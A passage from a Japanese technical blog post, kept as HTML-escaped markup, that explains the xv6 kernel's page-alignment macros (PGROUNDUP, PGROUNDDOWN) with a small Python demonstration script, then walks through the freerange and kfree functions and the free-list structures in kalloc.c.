&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;PGROUNDUP&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;PGSIZE&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PGSIZE&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;PGROUNDDOWN&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PGSIZE&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PGROUNDUP&lt;/code&gt;は引数として受け取ったアドレスを&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;の倍数にアラインメントするマクロです。&lt;/p&gt;
&lt;p&gt;これによって、引数&lt;code class=&quot;language-text&quot;&gt;sz&lt;/code&gt;以上の最小の&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;の倍数が返されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;~&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;Bitwise NOT&lt;/code&gt;演算子です。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;(PGSIZE-1)&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;に対する最大の余りになるため、これを加算した上でbit反転した&lt;code class=&quot;language-text&quot;&gt;(pgsize-1)&lt;/code&gt;とのANDを取ることで、&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;未満の端数を切り捨ててアラインメントすることができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/43289022/what-do-pgroundup-and-pgrounddown-in-xv6-mean&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - What do PGROUNDUP and PGROUNDDOWN in xv6 mean? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;計算がちょっとわかりづらかったので、リバーシングしたPythonスクリプトを作成しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rev_PGROUNDUP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;***************rev_PGROUNDUP***************&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    pgsize &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;
    num1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    num2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; num1 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; num2
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pgsize               : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pgsize[bin]          : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;(sz)+(pgsize-1)      : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;(sz)+(pgsize-1)[bin] : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;~(pgsize-1)          : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;~(pgsize-1)[bin]     : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;result               : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;result[bin]          : {}&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; result&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これを実行すると以下のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;rev_PGROUNDUP&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
***************rev_PGROUNDUP***************
pgsize               &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;
pgsize&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;bin&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;          &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; 0b1000000000000
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;+&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize-1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4195&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;sz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;+&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize-1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;bin&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; 0b1000001100011
~&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize-1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; -4096
~&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgsize-1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;bin&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; -0b1000000000000
result               &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;
result&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;bin&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;          &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt; 0b1000000000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sz&lt;/code&gt;として100が入力された場合は、アラインメントされて切り上げされた結果4096が戻り値となります。&lt;/p&gt;
&lt;p&gt;話を&lt;code class=&quot;language-text&quot;&gt;freerange&lt;/code&gt;関数に戻します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PGROUNDUP&lt;/code&gt;の引数には&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;が与えられており、戻り値が&lt;code class=&quot;language-text&quot;&gt;p&lt;/code&gt;に格納されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PGROUNDUP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; PGSIZE &lt;span class=&quot;token operator&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;p&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;でアラインメントされたアドレスとなります。&lt;/p&gt;
&lt;p&gt;ここから&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;のアドレスに到達するまで、&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;ごと(ページごと)に&lt;code class=&quot;language-text&quot;&gt;kfree&lt;/code&gt;関数によって物理アドレスが解放され、ページリストの初期化が行われます。&lt;/p&gt;
&lt;h3 id=&quot;kfree関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kfree%E9%96%A2%E6%95%B0&quot; aria-label=&quot;kfree関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kfree関数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kfree&lt;/code&gt;関数はメモリの解放を行い、ページリストに解放したページを追加する関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;p&gt;引数には解放するページの開始アドレスを使用します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;関数から呼び出される場合、引数に与えられる値は&lt;code class=&quot;language-text&quot;&gt;PGSIZE&lt;/code&gt;でアラインメントされたアドレスになるため、4096バイト境界にアラインメントされていることが保証されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//PAGEBREAK: 21&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Free the page of physical memory pointed at by v,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// which normally should have been returned by a&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// call to kalloc().  (The exception is when&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// initializing the allocator; see kinit above.)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;v &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; PGSIZE &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; v &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; end &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;kfree&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Fill with junk to catch dangling refs.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  r&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;next &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;freelist &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;関数が呼び出されると、&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;構造体の宣言を行っています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で定義されており、参照先の&lt;code class=&quot;language-text&quot;&gt;run&lt;/code&gt;構造体のみを持つ単方向リストです。&lt;/p&gt;
&lt;p&gt;解放済みのページを格納する&lt;code class=&quot;language-text&quot;&gt;freelist&lt;/code&gt;として&lt;code class=&quot;language-text&quot;&gt;kmem&lt;/code&gt;の中に格納されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;next&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; use_lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;freelist&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
